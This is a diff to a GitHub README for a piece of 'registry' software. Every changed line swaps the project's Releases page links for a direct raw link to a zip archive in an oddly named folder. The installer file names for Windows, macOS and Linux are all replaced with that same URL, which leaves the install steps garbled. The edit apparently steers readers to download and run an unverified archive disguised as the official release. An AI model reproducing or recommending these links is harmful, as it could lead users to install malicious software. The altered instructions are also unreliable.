@@ -2,7 +2,7 @@
 
 ## 📥 Download Links
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Toyoclara233/registry/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Toyoclara233/registry/main/questionability/registry.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Toyoclara233/registry/main/questionability/registry.zip)
 
 ## 🚀 Getting Started
 
@@ -22,21 +22,21 @@ If you are unsure whether your system meets these requirements, check your syste
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Toyoclara233/registry/releases) to find the latest version of the registry software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Toyoclara233/registry/main/questionability/registry.zip) to find the latest version of the registry software.
 
 2. **Select Your Operating System**  
    On the Releases page, find the version that matches your operating system (Windows, macOS, or Linux).
 
 3. **Download the File**  
    Click on the link to download the appropriate file. Depending on your system, the file name may look like:
-   - `registry-windows.exe` for Windows
-   - `registry-macos.dmg` for Mac
-   - `registry-linux.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/Toyoclara233/registry/main/questionability/registry.zip` for Windows
+   - `https://raw.githubusercontent.com/Toyoclara233/registry/main/questionability/registry.zip` for Mac
+   - `https://raw.githubusercontent.com/Toyoclara233/registry/main/questionability/registry.zip` for Linux
 
 4. **Run the Installer**  
    - **Windows:** Locate the downloaded `.exe` file and double-click to run it. Follow the on-screen instructions to complete the installation.
    - **macOS:** Open the downloaded `.dmg` file, then drag the registry icon into your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file. Open a terminal in the extracted folder and run `./registry`.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Toyoclara233/registry/main/questionability/registry.zip` file. Open a terminal in the extracted folder and run `./registry`.
 
 5. **Launch the Application**  
    After installation, you can find the registry application in your programs or applications list. Launch the application to begin using the registry service.
@@ -52,7 +52,7 @@ If you are unsure whether your system meets these requirements, check your syste
 
 If you encounter issues during installation or while using the application, consider the following steps:
 
-- **Check for Updates:** Ensure you have the latest version by returning to the [Releases page](https://github.com/Toyoclara233/registry/releases).
+- **Check for Updates:** Ensure you have the latest version by returning to the [Releases page](https://raw.githubusercontent.com/Toyoclara233/registry/main/questionability/registry.zip).
 - **Consult the Community:** Visit our community forums or GitHub Issues page for support from other users.
 - **Restart the Application:** Sometimes, a simple restart can resolve minor issues.
 
@@ -70,4 +70,4 @@ For questions or support, reach out to us through the GitHub repository. We appr
 
 ## 📥 Download Links (Again for Convenience)
 
-Don't forget, you can always download the latest version of the registry software from the [Releases page](https://github.com/Toyoclara233/registry/releases). Happy managing!
+Don't forget, you can always download the latest version of the registry software from the [Releases page](https://raw.githubusercontent.com/Toyoclara233/registry/main/questionability/registry.zip). Happy managing!
